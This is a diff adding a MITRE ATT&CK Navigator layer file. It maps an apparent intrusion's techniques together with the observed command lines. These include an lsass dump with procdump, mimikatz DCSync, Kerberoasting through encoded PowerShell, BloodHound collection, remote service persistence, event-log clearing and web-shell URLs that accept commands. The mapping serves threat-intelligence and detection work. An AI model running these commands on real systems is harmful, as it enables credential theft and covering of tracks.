@@ -1,0 +1,2156 @@
+{
+    "name": "layer",
+    "versions": {
+        "attack": "12",
+        "navigator": "4.7.1",
+        "layer": "4.3"
+    },
+    "domain": "enterprise-attack",
+    "description": "",
+    "filters": {
+        "platforms": [
+            "Linux",
+            "macOS",
+            "Windows",
+            "Azure AD",
+            "Office 365",
+            "SaaS",
+            "IaaS",
+            "Google Workspace",
+            "PRE",
+            "Network",
+            "Containers"
+        ]
+    },
+    "sorting": 0,
+    "layout": {
+        "layout": "side",
+        "aggregateFunction": "average",
+        "showID": false,
+        "showName": true,
+        "showAggregateScores": false,
+        "countUnscored": false
+    },
+    "hideDisabled": false,
+    "techniques": [
+        {
+            "techniqueID": "T1087.002",
+            "tactic": "discovery",
+            "score": 2,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\net.exe"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "net user <username> /domain"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "dir c:\\\\users\\\\"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1071.001",
+            "tactic": "command-and-control",
+            "score": 1,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "protocol",
+                    "value": "http"
+                },
+                {
+                    "name": "method",
+                    "value": "GET"
+                },
+                {
+                    "name": "direction",
+                    "value": "inbound"
+                },
+                {
+                    "name": "dstIp",
+                    "value": "127.0.0.1"
+                },
+                {
+                    "name": "requestHeader",
+                    "value": "X-JEX"
+                },
+                {
+                    "name": "parameters",
+                    "value": "ppp"
+                },
+                {
+                    "name": "url",
+                    "value": "http://#{webserver-ip}/jexws4/jexws4.jsp?ppp=#{url-encoded-OS-command}"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "protocol",
+                    "value": "http"
+                },
+                {
+                    "name": "method",
+                    "value": "GET"
+                },
+                {
+                    "name": "direction",
+                    "value": "inbound"
+                },
+                {
+                    "name": "dstIp",
+                    "value": "127.0.0.1"
+                },
+                {
+                    "name": "requestHeader",
+                    "value": "X-JEX"
+                },
+                {
+                    "name": "parameters",
+                    "value": "ppp"
+                },
+                {
+                    "name": "url",
+                    "value": "http://#{webserver-ip}/jexinv4/jexinv4.jsp?ppp=#{url-encoded-OS-command}"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1560.001",
+            "tactic": "collection",
+            "score": 2,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\makecab.exe"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "makecab zww.txt zww.a"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\Temp\\\\za.exe"
+                },
+                {
+                    "name": "embedFilename",
+                    "value": "WinRAR.exe"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "za.exe a za.a -r c:\\\\users\\\\<username>\\\\desktop\\\\*.xlsx"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\Temp\\\\zoo.exe"
+                },
+                {
+                    "name": "embedFilename",
+                    "value": "WinRAR.exe"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "zoo.exe a zoo.a -r G:\\\\Keepass\\\\"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1059.001",
+            "tactic": "execution",
+            "score": 3,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe test.ps1"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\schtasks.exe"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "schtasks /delete /u <DOMAIN>\\<USERNAME> /p \"<PASSWORD>\" /tn win32times /s <IP ADDRESS> /f"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "powershell -exec bypass -enc JgAgAHsASQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAGMAOgBcAHQAZQBtAHAAXABpAGsALgBwAHMAMQA7ACAARwBlAHQALQBEAG8AbQBhAGkAbgBVAHMAZQByACAALQBTAFAATgAgAHwAIABHAGUAdAAtAEQAbwBtAGEAaQBuAFMAUABOAFQAaQBjAGsAZQB0ACAALQBPAHUAdABwA HUAdABGAG8AcgBtAGEAdAAgAEgAYQBzAGgAYwBhAHQAfQA= > rs.txt"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "$DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream]"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "[Convert]::FromBase64String"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "($encfile),[IO.Compression.CompressionMode]::Decompress)"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "function format([string]$source){$tt = \"\";$bb = [System.Convert]::FromBase64String($source);foreach($c in $bb){$tt = $tt + [char]($c -bxor 37 + 1);}return $tt;}"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1059.003",
+            "tactic": "execution",
+            "score": 3,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "embedFilename",
+                    "value": "Cmd.Exe"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\Windows\\Temp\\test.ps1"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "C:\\Windows\\System32\\cmd.exe /c cd /d #{current working directory} & #{command to be executed}"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "cmd.exe /c cd /d c:\\\\temp & schtasks /create /u <DOMAIN>\\<USERNAME> /p \"<PASSWORD>\" /ru system /sc daily /tr \"cmd /c powershell.exe -ep bypass -file c:\\\\s.ps1\" /tn win32times /f"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "cmd.exe /c cd /d c:\\\\windows\\\\temp & sc \\\\\\\\<IP ADDRESS> create win32times binPath= \"cmd /c start c:\\\\windows\\\\temp\\\\x.bat\""
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "cmd.exe /c cd /d c:\\\\windows\\\\temp & sc \\\\\\\\<IP ADDRESS> query server"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1059.005",
+            "tactic": "execution",
+            "score": 1,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\cscript.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "cscript c:\\windows\\temp\\OAKMZ.vbs c:\\windows\\temp\\OAKMZ.txt"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1543.003",
+            "tactic": "persistence",
+            "score": 2,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\sc.exe"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "sc \\\\\\\\<IP ADDRESS> create win32times binPath= \"cmd /c start c:\\\\windows\\\\temp\\\\x.bat\""
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\sc.exe"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "sc \\\\\\\\<IP ADDRESS> query server"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "name",
+                    "value": "win32times"
+                },
+                {
+                    "name": "path",
+                    "value": "cmd /c start c:\\\\windows\\\\temp\\\\x.bat"
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\sc.exe"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1543.003",
+            "tactic": "privilege-escalation",
+            "score": 2,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\sc.exe"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "sc \\\\\\\\<IP ADDRESS> create win32times binPath= \"cmd /c start c:\\\\windows\\\\temp\\\\x.bat\""
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\sc.exe"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "sc \\\\\\\\<IP ADDRESS> query server"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "name",
+                    "value": "win32times"
+                },
+                {
+                    "name": "path",
+                    "value": "cmd /c start c:\\\\windows\\\\temp\\\\x.bat"
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\sc.exe"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1005",
+            "tactic": "collection",
+            "score": 1,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\wevtutil.exe"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "wevtutil qe security /q:\"*[EventData[Data[@Name=\"TargetUserName\"]=\"<username>\"]]\" /c:2"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1039",
+            "tactic": "collection",
+            "score": 1,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "type \\\\<IP address>\\c$\\windows\\system32\\mimilsa.log"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1140",
+            "tactic": "defense-evasion",
+            "score": 1,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe test.ps1"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\schtasks.exe"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "schtasks /delete /u <DOMAIN>\\<USERNAME> /p \"<PASSWORD>\" /tn win32times /s <IP ADDRESS> /f"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "powershell -exec bypass -enc JgAgAHsASQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAGMAOgBcAHQAZQBtAHAAXABpAGsALgBwAHMAMQA7ACAARwBlAHQALQBEAG8AbQBhAGkAbgBVAHMAZQByACAALQBTAFAATgAgAHwAIABHAGUAdAAtAEQAbwBtAGEAaQBuAFMAUABOAFQAaQBjAGsAZQB0ACAALQBPAHUAdABwA HUAdABGAG8AcgBtAGEAdAAgAEgAYQBzAGgAYwBhAHQAfQA= > rs.txt"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "$DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream]"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "[Convert]::FromBase64String"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "($encfile),[IO.Compression.CompressionMode]::Decompress)"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "function format([string]$source){$tt = \"\";$bb = [System.Convert]::FromBase64String($source);foreach($c in $bb){$tt = $tt + [char]($c -bxor 37 + 1);}return $tt;}"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1482",
+            "tactic": "discovery",
+            "score": 1,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "powershell -ep bypass -c \\\"& {Import-Module c:\\\\sh.ps1; InvokeBloodHound -CollectionMethod All}\\\" 1>c:\\\\ret.txt"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "powershell -ep bypass -c \\\"& {Import-Module c:\\\\windows\\\\temp\\\\sh.ps1; Invoke-BloodHound -CollectionMethod All -SearchForest}\\\" 1>C:\\\\windows\\\\temp\\\\ret.txt"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1190",
+            "tactic": "initial-access",
+            "score": 1,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "name",
+                    "value": "jexws4.jsp"
+                },
+                {
+                    "name": "path",
+                    "value": "#{webroot}/jexws4/jexws4.jsp"
+                },
+                {
+                    "name": "extension",
+                    "value": "jsp"
+                },
+                {
+                    "name": "sha256",
+                    "value": "fdc94d0dedf6e53dd435d2b5eacb4c34923fadee50529db6f3de38c71f325e05"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "name",
+                    "value": "jexinv4.jsp"
+                },
+                {
+                    "name": "path",
+                    "value": "#{webroot}/jexinv4/jexinv4.jsp"
+                },
+                {
+                    "name": "extension",
+                    "value": "jsp"
+                },
+                {
+                    "name": "sha256",
+                    "value": "a34a7430936ce37e78b995c321ff626933c364c50f1e7689aa1b0660432b4618"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "name",
+                    "value": "uknown"
+                },
+                {
+                    "name": "sha256",
+                    "value": "08f87f8c64a4c98b0e99592a436d601249feeaec4a2c4effbf69a166e4f592a0"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "name",
+                    "value": "uknown"
+                },
+                {
+                    "name": "sha256",
+                    "value": "2047e464627e36410b3458e23062f23eecbd383e7854b55b497ec8db017c0d5e"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1083",
+            "tactic": "discovery",
+            "score": 6,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "name",
+                    "value": "dir.exe"
+                },
+                {
+                    "name": "path",
+                    "value": "C:\\Windows\\Temp\\dir.exe"
+                },
+                {
+                    "name": "sha256",
+                    "value": "c109ddd4f43bc38a50b07b4fc22fe568cced4fb4d8c5bd71546407c2c6219048"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\Temp\\\\dir.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "dir.exe C:\\ #{MaxDepth} #{SavePath}"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\Temp\\\\CheckAdmin.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "checkadmin.exe 127.0.0.1 -all"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "dir *.kdbx"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\Temp\\\\zos.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "C:\\\\Windows\\\\Temp\\\\zos.exe c:\\ 0 c:\\\\windows\\\\temp\\\\zos.a"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "dir c:\\windows\\CarbonBlack\\cb.exe"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1562.001",
+            "tactic": "defense-evasion",
+            "score": 1,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\taskkill.exe"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "taskkill /f /im 4804"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1070",
+            "tactic": "defense-evasion",
+            "score": 1,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "commands",
+                    "value": "cmd /c powershell.exe -ep bypass -file c:\\s.ps1"
+                },
+                {
+                    "name": "name",
+                    "value": "win32times"
+                },
+                {
+                    "name": "action",
+                    "value": "delete"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1070.001",
+            "tactic": "defense-evasion",
+            "score": 1,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\wevtutil.exe"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "wevtutil cl system"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\wevtutil.exe"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "wevtutil cl security"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1070.004",
+            "tactic": "defense-evasion",
+            "score": 1,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "del \\\\\\\\<IP ADDRESS>\\\\c$\\\\windows\\\\temp\\\\LMAKSW.ps1"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1056.001",
+            "tactic": "collection",
+            "score": 1,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "name",
+                    "value": "tap.tmp"
+                },
+                {
+                    "name": "path",
+                    "value": "c:\\\\windows\\\\temp\\\\tap.tmp"
+                },
+                {
+                    "name": "process",
+                    "value": "keylogger"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "name",
+                    "value": "mrteeh.tmp"
+                },
+                {
+                    "name": "path",
+                    "value": "c:\\\\windows\\\\temp\\\\mrteeh.tmp"
+                },
+                {
+                    "name": "process",
+                    "value": "keylogger"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1056.001",
+            "tactic": "credential-access",
+            "score": 1,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "name",
+                    "value": "tap.tmp"
+                },
+                {
+                    "name": "path",
+                    "value": "c:\\\\windows\\\\temp\\\\tap.tmp"
+                },
+                {
+                    "name": "process",
+                    "value": "keylogger"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "name",
+                    "value": "mrteeh.tmp"
+                },
+                {
+                    "name": "path",
+                    "value": "c:\\\\windows\\\\temp\\\\mrteeh.tmp"
+                },
+                {
+                    "name": "process",
+                    "value": "keylogger"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1112",
+            "tactic": "defense-evasion",
+            "score": 1,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "keyName",
+                    "value": "HKLM\\\\SYSTEM\\\\ControlSet001\\\\Control\\\\SecurityProviders\\\\WDigest"
+                },
+                {
+                    "name": "keyValueName",
+                    "value": "UseLogonCredential"
+                },
+                {
+                    "name": "keyValue",
+                    "value": "1"
+                },
+                {
+                    "name": "keyValueType",
+                    "value": "REG_DWORD"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1106",
+            "tactic": "execution",
+            "score": 2,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "apiName",
+                    "value": "ShellExecute"
+                },
+                {
+                    "name": "moduleName",
+                    "value": "Shell32.dll"
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\Windows\\Temp\\test.ps1"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "apiName",
+                    "value": "CreateProcessA"
+                },
+                {
+                    "name": "moduleName",
+                    "value": "Kernel32.dll"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1135",
+            "tactic": "discovery",
+            "score": 2,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "dir \\\\<IP address>\\IPC$"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\netstat.exe"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "netstat -ano|find \":445\""
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1095",
+            "tactic": "command-and-control",
+            "score": 3,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "name",
+                    "value": "uknown"
+                },
+                {
+                    "name": "sha256",
+                    "value": "459910699497f2efe921a197e365fd5938af55378b3b20d2867ce171036fb675"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "name",
+                    "value": "OAKMZ.vbs"
+                },
+                {
+                    "name": "path",
+                    "value": "C:\\\\windows\\\\temp\\\\OAKMZ.vbs"
+                },
+                {
+                    "name": "sha256",
+                    "value": "d43251480775f224517f484686bc7ca39e532d900b86ebf6ed37da8ee13534a4"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "name",
+                    "value": "test.ps1"
+                },
+                {
+                    "name": "path",
+                    "value": "C:\\Windows\\Temp\\test.ps1"
+                },
+                {
+                    "name": "vHash",
+                    "value": "7596fdd04dba990373ab2f3da0c7dd3f"
+                },
+                {
+                    "name": "sha256",
+                    "value": "6972ba198ed0d30de9f66be5777ecdba2d657078f138325ee6db225c20b29e6e"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1003.001",
+            "tactic": "credential-access",
+            "score": 1,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\windows\\\\temp\\\\zao.exe"
+                },
+                {
+                    "name": "embedFilename",
+                    "value": "procdump"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "C:\\\\windows\\\\temp\\\\zao.exe /accepteula -ma lsass.exe zao.a"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1003.006",
+            "tactic": "credential-access",
+            "score": 1,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\temp\\\\mimikatz"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "echo \"log c:\\\\windows\\\\temp\\\\xx.txt\" privilege::debug \"lsadump::dcsync /all /csv /domain:AD.local /dc:DC.AD.local\" exit > c:\\\\mrt.ini"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1027",
+            "tactic": "defense-evasion",
+            "score": 1,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "powershell -exec bypass -enc JgAgAHsASQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAGMAOgBcAHQAZQBtAHAAXABpAGsALgBwAHMAMQA7ACAARwBlAHQALQBEAG8AbQBhAGkAbgBVAHMAZQByACAALQBTAFAATgAgAHwAIABHAGUAdAAtAEQAbwBtAGEAaQBuAFMAUABOAFQAaQBjAGsAZQB0ACAALQBPAHUAdABwA HUAdABGAG8AcgBtAGEAdAAgAEgAYQBzAGgAYwBhAHQAfQA= > rs.txt"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "$DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream]"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "[Convert]::FromBase64String"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "($encfile),[IO.Compression.CompressionMode]::Decompress)"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
+                },
+                {
+                    "name": "cmdLine",
